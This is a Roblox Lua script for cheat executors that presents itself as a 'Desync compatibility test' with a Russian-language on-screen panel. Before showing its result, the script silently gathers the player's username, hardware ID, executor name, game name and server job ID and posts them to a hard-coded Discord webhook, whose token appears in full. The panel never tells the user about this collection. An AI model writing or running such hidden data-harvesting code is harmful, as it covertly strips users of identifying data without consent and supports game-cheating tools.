local OSTime = os.time();
local Time = os.date('!*t', OSTime);
local HWID = game:GetService("RbxAnalyticsService"):GetClientId();
local Avatar = 'https://cdn.discordapp.com/embed/avatars/4.png';
local player = game.Players.LocalPlayer
local ExecName, ExecVersion = identifyexecutor()
local GameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
local playername = player.name
local GameId = game.PlaceId
local PlayerId = player.CharacterAppearanceId
local status = "🟡"
local raknetsupport = Raknet ~= nil
if not raknetsupport then
    status = "🔴"
elseif raknetsupport then
    status = "🟢"
end
local Content = '';
local Embed = {
    title = 'Данные Пользователя';
    color = 5814783;
    footer = { text = game.JobId };
    author = {
        name = 'Compatibility Test Executed';
        url = '';
    };
    fields = {
        {
            name = 'Username:';
            value = '@'.. playername;
        };
        {
            name = 'Executor name:';
            value = ExecName .. ' ' .. ExecVersion;
        };
        {
            name = '';
            value = "Test Verdict: ".. status;
        };
        {
            name = 'Game Name:';
            value = GameName;
        };
        {
            name = 'HWID:';
            value = HWID;
        };
    };
    timestamp = string.format('%d-%d-%dT%02d:%02d:%02dZ', Time.year, Time.month, Time.day, Time.hour, Time.min, Time.sec);
};
(syn and syn.request or http_request) {
    Url = 'https://discord.com/api/webhooks/1467284019505922141/JyF6w-nAxhHyKuAdh2seGF3smybghXc9wuaWtES-4ZLjWnWjc0Mk4AScELFnR7JuWxFX';
    Method = 'POST';
    Headers = {
        ['Content-Type'] = 'application/json';
    };
    Body = game:GetService('HttpService'):JSONEncode({ content = Content; embeds = { Embed } });
}; 
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "MyMenuGui"
screenGui.ResetOnSpawn = false
local playerGui = LocalPlayer:WaitForChild("PlayerGui", 3)
if not playerGui then
    warn("PlayerGui не найден")
    return
end
screenGui.Parent = playerGui
local backscreen = Instance.new("Frame")
backscreen.Name = "Background"
backscreen.Size = UDim2.new(0.4, 0, 0.4, 0)  
backscreen.Position = UDim2.new(0.3, 0, 0.3, 0)
backscreen.BackgroundColor3 = Color3.new(0, 0, 0)
backscreen.BackgroundTransparency = 0
backscreen.Parent = screenGui
-- label1
local label = Instance.new("TextLabel")
label.Name = "StatusLabel"
label.Size = UDim2.new(0, 300, 0, 100)
label.Position = UDim2.new(0.5, -150, 0.1, -50)
label.Text = "Проверка совместимости"
label.TextColor3 = Color3.new(1, 1, 1)
label.BackgroundTransparency = 1
label.TextSize = 36
label.TextScaled = false 
label.Font = Enum.Font.SourceSansBold
label.Parent = backscreen
-- label2
local label = Instance.new("TextLabel")
label.Name = "StatusLabel"
label.Size = UDim2.new(0, 300, 0, 100)
label.Position = UDim2.new(0.3, -150, 0.25, -50)
label.Text = "Название инжектора: ".. ExecName .." ".. ExecVersion
label.TextColor3 = Color3.new(1, 1, 1)
label.BackgroundTransparency = 1
label.TextSize = 28
label.TextScaled = false 
label.Font = Enum.Font.SourceSansBold
label.Parent = backscreen
-- label3
local label = Instance.new("TextLabel")
label.Name = "StatusLabel"
label.Size = UDim2.new(0, 300, 0, 100)
label.Position = UDim2.new(0.387, -150, 0.35, -50)
label.Text = "Ваш хвид: ".. HWID
label.TextColor3 = Color3.new(0.9, 0.9, 0.9)
label.BackgroundTransparency = 1
label.TextSize = 28
label.TextScaled = false 
label.Font = Enum.Font.SourceSansBold
label.Parent = backscreen
-- label4
local label = Instance.new("TextLabel")
label.Name = "StatusLabel"
label.Size = UDim2.new(0, 300, 0, 100)
label.Position = UDim2.new(0.189, -150, 0.45, -50)
label.Text = "Поддержка Desync: ".. status
label.TextColor3 = Color3.new(0.9, 0.9, 0.9)
label.BackgroundTransparency = 1
label.TextSize = 28
label.TextScaled = false 
label.Font = Enum.Font.SourceSansBold
label.Parent = backscreen
-- info label
local label = Instance.new("TextLabel")
label.Name = "StatusLabel"
label.Size = UDim2.new(0, 300, 0, 100)
label.Position = UDim2.new(0.14, -150, 0.55, -50)
label.Text = "🟢 - Desync поддерживается."
label.TextColor3 = Color3.new(0.2, 0.2, 0.2)
label.BackgroundTransparency = 1
label.TextSize = 14
label.TextScaled = false 
label.Font = Enum.Font.SourceSansBold
label.Parent = backscreen
-- info label2
local label = Instance.new("TextLabel")
label.Name = "StatusLabel"
label.Size = UDim2.new(0, 300, 0, 100)
label.Position = UDim2.new(0.163, -150, 0.6, -50)
label.Text = "🟡 - Не удалось провести проверку."
label.TextColor3 = Color3.new(0.2, 0.2, 0.2)
label.BackgroundTransparency = 1
label.TextSize = 14
label.TextScaled = false 
label.Font = Enum.Font.SourceSansBold
label.Parent = backscreen
-- info label3
local label = Instance.new("TextLabel")
label.Name = "StatusLabel"
label.Size = UDim2.new(0, 300, 0, 100)
label.Position = UDim2.new(0.15, -150, 0.65, -50)
label.Text = "🔴 - Desync не поддерживается."
label.TextColor3 = Color3.new(0.2, 0.2, 0.2)
label.BackgroundTransparency = 1
label.TextSize = 14
label.TextScaled = false 
label.Font = Enum.Font.SourceSansBold
label.Parent = backscreen
wait(10)
screenGui:Destroy()
